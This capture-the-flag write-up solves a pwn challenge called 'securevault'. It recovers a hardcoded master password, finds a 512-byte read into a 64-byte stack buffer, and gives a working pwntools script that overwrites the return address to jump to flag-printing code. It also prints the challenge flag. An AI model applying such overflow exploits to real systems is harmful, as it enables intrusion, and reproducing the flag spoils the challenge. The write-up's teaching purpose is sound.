# SecureVault - PWN Challenge Writeup

**Category:** PWN
**Flag:** `esch{canaries-can-be-bypassed-falcon-raven-307}`

---

## TL;DR

Found a hardcoded password, then exploited a buffer overflow in the "feedback" feature to jump directly to a hidden function that prints the flag.

---

## The Challenge

We're given a binary called `securevault` - a "military-grade" password manager that's supposedly super secure. The challenge description is dripping with confidence about their security, which in CTF-speak means "please hack me."

## Initial Recon

First things first - let's see what we're dealing with:

```
$ file securevault
ELF 64-bit LSB executable, x86-64, statically linked, stripped

$ checksec securevault
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found    <-- nice!
    NX:         NX enabled
    PIE:        No PIE (0x400000)  <-- addresses are fixed!
```

Key observations:
- **No PIE** = addresses don't change between runs
- **No stack canary** = buffer overflows are back on the menu
- **Statically linked** = all libc is baked in (no ASLR bypass needed)

## Finding the Password

Loading the binary into Binary Ninja and poking around, I found the authentication function. It's comparing our input against... a hardcoded password. In plain text. In 2026.

```c
if (strcmp(input, "Sup3rS3cr3tM@st3r!") == 0) {
    puts("[+] Authentication successful!");
    return 1;
}
```

Master password: **`Sup3rS3cr3tM@st3r!`**

Okay, we're in. But that's not the flag - that would be too easy.

## Exploring the Menu

After authenticating, we get a menu:

```
=== Main Menu ===
1. Add new entry
2. List entries
3. Get entry password
4. Leave feedback
5. Exit
```

Options 1-3 look normal. Option 4 is... feedback? In a password manager? That's suspicious. Let's dig into it.

## The Vulnerability

Looking at option 4 (the feedback function), I found gold:

```c
void feedback_function() {
    char rating[8];      // at rsp+0x08
    char feedback[64];   // at rsp+0x10

    printf("Rating (1-5): ");
    fgets(rating, 8, stdin);

    printf("Your detailed feedback: ");
    read(0, feedback, 0x200);  // <-- READS 512 BYTES INTO 64-BYTE BUFFER!
}
```

They're reading **512 bytes** into a buffer that only has **64 bytes** of space. Classic buffer overflow!

### Stack Layout

```
+------------------+ rsp+0x00
|   (unused)       |
+------------------+ rsp+0x08
|   rating[8]      |
+------------------+ rsp+0x10
|                  |
|   feedback[64]   |  <-- We write here
|                  |
+------------------+ rsp+0x50
|   saved RBX      |
+------------------+ rsp+0x58
|  RETURN ADDRESS  |  <-- We overwrite this!
+------------------+
```

Distance from `feedback` buffer to return address: `0x58 - 0x10 = 0x48 = 72 bytes`

## Finding the Win Function

Searching for interesting strings, I found:

```
"[FLAG] Congratulations! Here is your flag: %s"
```

Following the cross-references led me to a function that:
1. Checks three "security tokens" (global variables)
2. If they match specific magic values, reads and prints the flag
3. The magic values are: `0x7a3f9d2e`, `0x4b8c1e5a`, `0x2d6f8a1c`

But here's the thing - we don't need to set those tokens. We can just jump past all the checks!

```asm
0x401d3b:  mov edi, "All tokens verified successfully!"
0x401d40:  call puts
0x401d45:  call read_flag      ; reads FLAG env variable
0x401d4a:  mov rsi, rax
0x401d4d:  mov edi, "[FLAG] Congratulations!..."
0x401d52:  call printf         ; prints the flag!
```

If we return to `0x401d3b`, we skip all the token checks and go straight to flag printing!

## The Exploit

```python
from pwn import *

r = remote('node-5.mcsc.space', 34189)

# Authenticate
r.recvuntil(b'Enter master password:')
r.sendline(b'Sup3rS3cr3tM@st3r!')

# Go to feedback (option 4)
r.recvuntil(b'> ')
r.sendline(b'4')

# Enter a rating
r.recvuntil(b'Rating (1-5):')
r.sendline(b'5')

# Build the overflow payload
payload = b'A' * 64        # Fill the feedback buffer
payload += b'B' * 8        # Overwrite saved RBX (don't care about value)
payload += p64(0x401d3b)   # Return address -> skip to flag printing

# Send it
r.recvuntil(b'Your detailed feedback:')
r.sendline(payload)

# Get flag
print(r.recvall().decode())
```

## The Flag

```
[SECURITY] All tokens verified successfully!
[FLAG] Congratulations! Here is your flag: esch{canaries-can-be-bypassed-falcon-raven-307}
```

## Lessons Learned

1. **Never hardcode passwords** - Not even "temporary" ones
2. **Always validate buffer sizes** - `read(fd, buf, 512)` into a 64-byte buffer is a bad time
3. **Stack canaries exist for a reason** - This exploit wouldn't work if they had `-fstack-protector`
4. **Security checks in the same function as the prize** - If your "win" code is reachable by jumping past checks, you've already lost

The flag itself is a nice hint: "canaries can be bypassed" - referencing that this binary has no stack canary protection, making our buffer overflow trivial to exploit.

---

*Writeup by a security enthusiast who appreciates when challenge authors leave the welcome mat out.*
